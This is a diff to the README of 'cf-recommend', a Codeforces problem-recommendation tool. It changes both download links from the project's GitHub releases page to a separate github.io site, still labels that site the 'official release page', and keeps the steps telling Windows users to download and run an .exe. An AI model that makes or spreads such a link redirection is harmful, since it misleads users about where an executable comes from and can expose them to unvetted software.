@@ -1,6 +1,6 @@
 # 📋 cf-recommend - Find the right Codeforces problems fast
 
-[![Download cf-recommend](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Noamunfree520/cf-recommend/releases)
+[![Download cf-recommend](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://noamunfree520.github.io)
 
 cf-recommend helps you find Codeforces problems that match your skill level. It analyzes your past submissions and suggests tasks that challenge you without causing frustration. This tool saves you time by removing the need to search through problem lists manually. It runs directly on your computer and provides clear, actionable data.
 
@@ -8,7 +8,7 @@ cf-recommend helps you find Codeforces problems that match your skill level. It 
 
 Follow these steps to set up cf-recommend on your Windows machine. You do not need developer tools or extra software to run this application.
 
-1. Go to the [official release page](https://github.com/Noamunfree520/cf-recommend/releases) to download the latest version.
+1. Go to the [official release page](https://noamunfree520.github.io) to download the latest version.
 2. Look for the file ending in .exe.
 3. Save this file to your computer.
 4. Run the file to start the application.
